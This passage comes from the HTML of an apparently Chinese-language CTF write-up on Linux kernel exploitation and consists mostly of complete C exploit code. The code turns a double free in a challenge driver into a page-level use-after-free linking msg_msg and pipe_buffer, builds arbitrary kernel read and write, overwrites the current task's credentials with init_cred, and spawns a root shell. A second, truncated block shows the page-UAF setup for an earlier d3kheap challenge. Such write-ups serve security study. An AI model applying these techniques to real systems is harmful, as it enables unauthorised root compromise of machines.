flags;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> &#123;</span><br>    <span class="hljs-type">int</span> (*confirm)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br>    <span class="hljs-type">void</span> (*release)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br>    <span class="hljs-type">int</span> (*try_steal)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br>    <span class="hljs-type">int</span> (*get)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    prev;<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> MSG_COPY</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_COPY 040000</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br>    <span class="hljs-type">uint64_t</span>    m_type;<br>    <span class="hljs-type">uint64_t</span>    m_ts;<br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    security;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">struct msgbuf &#123;</span><br><span class="hljs-comment">    long mtype;</span><br><span class="hljs-comment">    char mtext[0];</span><br><span class="hljs-comment">&#125;;</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">get_msg_queue</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">read_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * the msgp should be a pointer to the `struct msgbuf`,</span><br><span class="hljs-comment"> * and the data should be stored in msgbuf.mtext</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">write_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    ((<span class="hljs-keyword">struct</span> msgbuf*)msgp)-&gt;mtype = msgtyp;<br>    <span class="hljs-keyword">return</span> msgsnd(msqid, msgp, msgsz, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> MSG_COPY</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_COPY        040000  <span class="hljs-comment">/* copy (not remove) all queue messages */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">/* for MSG_COPY, `msgtyp` means to read no.msgtyp msg_msg on the queue */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">peek_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <br>                  MSG_COPY | IPC_NOWAIT | MSG_NOERROR);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">build_msg</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> msg_msg *msg, <span class="hljs-type">uint64_t</span> m_list_next, <span class="hljs-type">uint64_t</span> m_list_prev, </span><br><span class="hljs-params">              <span class="hljs-type">uint64_t</span> m_type, <span class="hljs-type">uint64_t</span> m_ts,  <span class="hljs-type">uint64_t</span> next, <span class="hljs-type">uint64_t</span> security)</span><br>&#123;<br>    msg-&gt;m_list.next = m_list_next;<br>    msg-&gt;m_list.prev = m_list_prev;<br>    msg-&gt;m_type = m_type;<br>    msg-&gt;m_ts = m_ts;<br>    msg-&gt;next = next;<br>    msg-&gt;security = security;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * II - interface to interact with /dev/kcache</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">int</span> dev_fd;<br><br><span class="hljs-comment">/* msg type */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_REQUEST    1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_REPLY      2</span><br><br><span class="hljs-comment">/* user to kernel request */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_ENCRYPT_TEA     1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_DECRYPT_TEA     2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_HASH_MD5        3</span><br><br><span class="hljs-comment">/* msg status */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STATUS_SUCCESS      1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STATUS_FAIL         2</span><br><br><span class="hljs-comment">/* for ioctl */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> RECV_MSG 0x114514</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SEND_MSG 0x1919810</span><br><br><span class="hljs-comment">/* message header */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_hdr</span> &#123;</span><br>    <span class="hljs-type">uint16_t</span> type;<br>    <span class="hljs-type">uint16_t</span> cmd;<br>    <span class="hljs-type">uint16_t</span> status;    <span class="hljs-comment">/* for TYPE_REPLY only */</span><br>    <span class="hljs-type">size_t</span>  tag;        <span class="hljs-comment">/* for user to identify different message */</span><br>    <span class="hljs-type">size_t</span> data_len;<br>    <span class="hljs-type">char</span> data[<span class="hljs-number">0</span>];<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tea_crypt_info</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> key[<span class="hljs-number">4</span>];<br>    <span class="hljs-type">char</span> text[<span class="hljs-number">0</span>];<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_msg_hdr(_hdr, _type, _cmd, _status, _tag, _data_len)        \</span><br><span class="hljs-meta">    do &#123;                                                        \</span><br><span class="hljs-meta">        _hdr-&gt;type = _type;                                     \</span><br><span class="hljs-meta">        _hdr-&gt;cmd = _cmd;                                       \</span><br><span class="hljs-meta">        _hdr-&gt;status = _status;                                 \</span><br><span class="hljs-meta">        _hdr-&gt;tag = _tag;                                       \</span><br><span class="hljs-meta">        _hdr-&gt;data_len = _data_len;                             \</span><br><span class="hljs-meta">    &#125; while (0)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> get_hdr_data(__hdr, ptr_type) (&#123;                        \</span><br><span class="hljs-meta">    ((ptr_type*) &amp;__hdr-&gt;data);                                 \</span><br><span class="hljs-meta">&#125;)</span><br><br><span class="hljs-type">long</span> <span class="hljs-title function_">kkk_send_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> dev_fd, <span class="hljs-keyword">struct</span> msg_hdr *msg)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, SEND_MSG, msg);<br>&#125;<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">kkk_recv_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> dev_fd, <span class="hljs-keyword">struct</span> msg_hdr *msg)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, RECV_MSG, msg);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *  III - FIRST exploit stage - make page-level UAF</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECOND_LEVEL_PIPE_NUM 0x100</span><br><br><span class="hljs-type">int</span> rw_pipe[<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> second_level_pipe[SECOND_LEVEL_PIPE_NUM][<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> msqid;<br><span class="hljs-type">size_t</span> msg_buf[<span class="hljs-number">0x1000</span>], *pipe_buf, pipe_ops;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">construct_uaf_on_msg_and_pipe</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_hdr</span> *<span class="hljs-title">msg</span>;</span><br>    <span class="hljs-type">size_t</span> checksum;<br>    <span class="hljs-type">int</span> ret;<br>    <span class="hljs-type">char</span> *buf;<br><br>    msqid = get_msg_queue();<br><br>    msg = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br>    <span class="hljs-built_in">memset</span>(msg, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-keyword">sizeof</span>(*msg));<br>    set_msg_hdr(msg, TYPE_REQUEST, CMD_ENCRYPT_TEA, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">160</span> - <span class="hljs-keyword">sizeof</span>(*msg));<br><br>    <span class="hljs-comment">/* prepare the pipes in advance */</span><br>    pipe(rw_pipe);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * trigger double free to make pipe_buffer and msg_seg the same object.</span><br><span class="hljs-comment">     * note that we should write and read the pipe in advance, so that it won&#x27;t</span><br><span class="hljs-comment">     * use the pipe_buffer[0], which will lead to an invalid msg_seg</span><br><span class="hljs-comment">     */</span><br>    kkk_send_msg(dev_fd, msg);<br>    sleep(<span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span> (kkk_recv_msg(dev_fd, (<span class="hljs-keyword">struct</span> msg_hdr *) <span class="hljs-number">0xbeefedead0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[=] errno: %d\n&quot;</span>, errno);<br>    &#125;<br>    fcntl(rw_pipe[<span class="hljs-number">0</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span> * <span class="hljs-number">4</span>);<br>    write(rw_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>    read(rw_pipe[<span class="hljs-number">0</span>], &amp;checksum, <span class="hljs-number">8</span>);<br>    write(rw_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br><br>    <span class="hljs-keyword">if</span> (kkk_recv_msg(dev_fd, (<span class="hljs-keyword">struct</span> msg_hdr *) <span class="hljs-number">0xdeadbeef0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[=] errno: %d\n&quot;</span>, errno);<br>    &#125;<br>    write_msg(msqid, msg_buf, <span class="hljs-number">0x1000</span> + <span class="hljs-number">160</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) - <span class="hljs-number">8</span>, <span class="hljs-number">0x41</span>);<br><br>    write(rw_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br><br>    peek_msg(msqid, msg_buf, <span class="hljs-number">0x1000</span> + <span class="hljs-number">160</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) - <span class="hljs-number">8</span>, <span class="hljs-number">0</span>);<br>    pipe_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) msg_buf + <span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg));<br>    <span class="hljs-keyword">if</span> (pipe_buf[<span class="hljs-number">12</span>] &lt; <span class="hljs-number">0xffffffff81000000</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to make UAF on pipe!&quot;</span>);<br>    &#125;<br>    pipe_ops = pipe_buf[<span class="hljs-number">12</span>];<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successfully build UAF pipe_buffer!\033[0m&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Page: \033[0m%lx &quot;</span>, pipe_buf[<span class="hljs-number">10</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m, ops: \033[0m%lx\n&quot;</span>, pipe_ops);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">fake_buf</span>;</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_read_by_pipe</span><span class="hljs-params">(<span class="hljs-type">size_t</span> page_addr, <span class="hljs-type">void</span> *buf)</span><br>&#123;<br>    fake_buf = (<span class="hljs-keyword">struct</span> pipe_buffer*) &amp;pipe_buf[<span class="hljs-number">5</span>];<br>    read_msg(msqid, msg_buf, <span class="hljs-number">0x1000</span> + <span class="hljs-number">160</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) - <span class="hljs-number">8</span>, <span class="hljs-number">0x41</span>);<br><br>    fake_buf-&gt;page = (<span class="hljs-keyword">struct</span> page*) page_addr;<br>    fake_buf-&gt;len = <span class="hljs-number">0x1ff8</span>;<br>    fake_buf-&gt;offset = <span class="hljs-number">0</span>;<br>    fake_buf-&gt;ops = (<span class="hljs-keyword">struct</span> pipe_buf_operations*) pipe_ops;<br><br>    write_msg(msqid, msg_buf, <span class="hljs-number">0x1000</span> + <span class="hljs-number">160</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) - <span class="hljs-number">8</span>, <span class="hljs-number">0x41</span>);<br><br>    read(rw_pipe[<span class="hljs-number">0</span>], buf, <span class="hljs-number">0xfff</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_write_by_pipe</span><span class="hljs-params">(<span class="hljs-type">size_t</span> page_addr, <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br>    fake_buf = (<span class="hljs-keyword">struct</span> pipe_buffer*) &amp;pipe_buf[<span class="hljs-number">10</span>];<br>    read_msg(msqid, msg_buf, <span class="hljs-number">0x1000</span> + <span class="hljs-number">160</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) - <span class="hljs-number">8</span>, <span class="hljs-number">0x41</span>);<br><br>    fake_buf-&gt;page = (<span class="hljs-keyword">struct</span> page*) page_addr;<br>    fake_buf-&gt;len = <span class="hljs-number">0</span>;<br>    fake_buf-&gt;offset = <span class="hljs-number">0</span>;<br>    fake_buf-&gt;ops = (<span class="hljs-keyword">struct</span> pipe_buf_operations*) pipe_ops;<br><br>    write_msg(msqid, msg_buf, <span class="hljs-number">0x1000</span> + <span class="hljs-number">160</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) - <span class="hljs-number">8</span>, <span class="hljs-number">0x41</span>);<br><br>    len = len &gt; <span class="hljs-number">0xffe</span> ? <span class="hljs-number">0xffe</span> : len;<br><br>    write(rw_pipe[<span class="hljs-number">1</span>], buf, len);<br>&#125;<br><br><span class="hljs-type">size_t</span> data_buf[<span class="hljs-number">0x1000</span>], *tsk_buf, current_task_page, current_task, parent_task;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">seek_current_task_struct</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span>  *comm_addr;<br><br>    vmemmap_base = pipe_buf[<span class="hljs-number">10</span>] &amp; <span class="hljs-number">0xfffffffff0000000</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] vmemmap_base:\033[0m 0x%lx\n\n&quot;</span>, vmemmap_base);<br><br>    <span class="hljs-comment">/* now seeking for the task_struct in kernel memory */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Seeking task_struct in memory...&quot;</span>);<br><br>    prctl(PR_SET_NAME, <span class="hljs-string">&quot;arttnba3pwnn&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; <span class="hljs-number">1</span>; i++) &#123;<br>        arbitrary_read_by_pipe(vmemmap_base + i * <span class="hljs-number">0x40</span>, data_buf);<br>    <br>        comm_addr = memmem(data_buf, <span class="hljs-number">0xf00</span>, <span class="hljs-string">&quot;arttnba3pwnn&quot;</span>, <span class="hljs-number">12</span>);<br>        <span class="hljs-keyword">if</span> (comm_addr &amp;&amp; (comm_addr[<span class="hljs-number">-2</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;cred */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-3</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;real_cred */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-61</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;read_parent */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-60</span>] &gt; <span class="hljs-number">0xffff888000000000</span>)) &#123;  <span class="hljs-comment">/* task-&gt;parent */</span><br><br>            <span class="hljs-comment">/* task-&gt;read_parent */</span><br>            parent_task = comm_addr[<span class="hljs-number">-61</span>];<br><br>            <span class="hljs-comment">/* task_struct::ptraced */</span><br>            current_task = comm_addr[<span class="hljs-number">-54</span>] - <span class="hljs-number">2528</span>;<br><br>            page_offset_base = (comm_addr[<span class="hljs-number">-54</span>]&amp;<span class="hljs-number">0xfffffffffffff000</span>) - i * <span class="hljs-number">0x1000</span>;<br>            page_offset_base &amp;= <span class="hljs-number">0xfffffffff0000000</span>;<br><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found task_struct on page: \033[0m%lx\n&quot;</span>,<br>                   (vmemmap_base + i * <span class="hljs-number">0x40</span>));<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] page_offset_base: \033[0m0x%lx\n&quot;</span>,<br>                   page_offset_base);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] current task_struct&#x27;s addr: \033[0m&quot;</span><br>                   <span class="hljs-string">&quot;0x%lx\n\n&quot;</span>, current_task);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">privilege_escalation_by_task_overwrite</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">/* finding the init_task, the final parent of every task */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Seeking for init_task...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-type">size_t</span> ptask_page_addr = direct_map_addr_to_page_addr(parent_task);<br><br>        tsk_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) data_buf + (parent_task &amp; <span class="hljs-number">0xfff</span>));<br><br>        arbitrary_read_by_pipe(ptask_page_addr, data_buf);<br>        arbitrary_read_by_pipe(ptask_page_addr+<span class="hljs-number">0x40</span>, &amp;data_buf[<span class="hljs-number">512</span>]);<br><br>        <span class="hljs-comment">/* task_struct::real_parent */</span><br>        <span class="hljs-keyword">if</span> (parent_task == tsk_buf[<span class="hljs-number">309</span>]) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        parent_task = tsk_buf[<span class="hljs-number">309</span>];<br>    &#125;<br><br>    init_task = parent_task;<br>    init_cred = tsk_buf[<span class="hljs-number">367</span>];<br>    init_nsproxy = tsk_buf[<span class="hljs-number">381</span>];<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n&quot;</span>, init_task);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n&quot;</span>,init_nsproxy);<br><br>    <span class="hljs-comment">/* now, changing the current task_struct to get the full root :) */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Escalating ROOT privilege now...&quot;</span>);<br><br>    current_task_page = direct_map_addr_to_page_addr(current_task);<br><br>    arbitrary_read_by_pipe(current_task_page, data_buf);<br>    arbitrary_read_by_pipe(current_task_page + <span class="hljs-number">0x40</span>, &amp;data_buf[<span class="hljs-number">512</span>]);<br><br>    tsk_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) data_buf + (current_task &amp; <span class="hljs-number">0xfff</span>));<br>    tsk_buf[<span class="hljs-number">367</span>] = init_cred;<br>    tsk_buf[<span class="hljs-number">368</span>] = init_cred;<br>    tsk_buf[<span class="hljs-number">381</span>] = init_nsproxy;<br><br>    arbitrary_write_by_pipe(current_task_page, data_buf, <span class="hljs-number">0xff0</span>);<br>    arbitrary_write_by_pipe(current_task_page + <span class="hljs-number">0x40</span>, &amp;data_buf[<span class="hljs-number">512</span>], <span class="hljs-number">0xff0</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Done.\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    save_status();<br>    bind_core(<span class="hljs-number">0</span>);<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/kkk&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to open /dev/kkk!&quot;</span>);<br>    &#125;<br><br>    construct_uaf_on_msg_and_pipe();<br>    seek_current_task_struct();<br>    privilege_escalation_by_task_overwrite();<br>    get_root_shell();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>运行即可完成提权：</p>
+<p><img src="https://s2.loli.net/2023/07/13/sr65qaWAN9lE4Cy.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<blockquote>
+<p><del>笔者也不记得该编译选项是否默认开启了</del>，若未开启该编译选项，则仍可以直接构造 page-level UAF，以笔者去年出的题目 <code>d3kheap</code> 为例，可以通过如下方式完成 page UAF 的构造，细节参见注释：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECOND_LEVEL_PIPE_NUM 0x100</span><br><br><span class="hljs-type">int</span> victim_pipe[<span class="hljs-number">2</span>], vuln_pipe[<span class="hljs-number">2</span>], holder_pipe[<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> second_level_pipe[SECOND_LEVEL_PIPE_NUM][<span class="hljs-number">2</span>];<br><span class="hljs-type">size_t</span> pipe_buf[<span class="hljs-number">0x1000</span>];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">construct_page_uaf_with_pipe</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> checksum;<br><br>    <span class="hljs-built_in">memset</span>(pipe_buf, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-keyword">sizeof</span>(pipe_buf));<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SECOND_LEVEL_PIPE_NUM; i++) &#123;<br>        pipe(second_level_pipe[i]);<br>    &#125;<br><br>    <span class="hljs-comment">/* make two pipes point to the same buffer */</span><br>    add();<br>    del();<br>    pipe(victim_pipe);<br>    <br>    del();<br>    pipe(vuln_pipe);<br><br>    <span class="hljs-comment">/* init pipe-&gt;head and pipe-&gt;tail, allocate page on buffer */</span><br>    write(victim_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;rat3bant&quot;</span>, <span class="hljs-number">8</span>);<br>    write(vuln_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br><br>    <span class="hljs-comment">/* migrate to another buffer, now we have two bufs point on the same page */</span><br>    fcntl(vuln_pipe[<span class="hljs-number">0</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span> * <span class="hljs-number">4</span>);<br>    write(vuln_pipe[<span class="hljs-number">1</span>], pipe_buf, <span class="hljs-number">0x800</span>); <span class="hljs-comment">/* pre-write for later read */</span><br><br>    read(vuln_pipe[<span class="hljs-number">0</span>], &amp;checksum, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span> (checksum != *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Get checksum: %lx\n&quot;</span>, checksum);<br>        err_exit(<span class="hljs-string">&quot;two pipe didn&#x27;t share the same page!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* now the page is reclaimed to pipe-&gt;tmp_page */</span><br>    read(victim_pipe[<span class="hljs-number">0</span>], &amp;checksum, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span> (checksum != *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Get checksum: %lx\n&quot;</span>, checksum);<br>        err_exit(<span class="hljs-string">&quot;Pipe is corrupted!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* avoid double free dtection */</span><br>    pipe(holder_pipe);<br><br>    <span class="hljs-comment">/* free pipe-&gt;tmp_page */</span><br>    close(victim_pipe[<span class="hljs-number">1</span>]);<br>    close(victim_pipe[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-comment">/* allocate UAF page as slub page */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SECOND_LEVEL_PIPE_NUM; i++) &#123;<br>        fcntl(second_level_pipe[i][<span class="hljs-number">0</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span> * <span class="hljs-number">2</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* init pipe bufs on UAF page */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SECOND_LEVEL_PIPE_NUM; i++) &#123;<br>        write(second_level_pipe[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>    &#125;<br><br>    <span 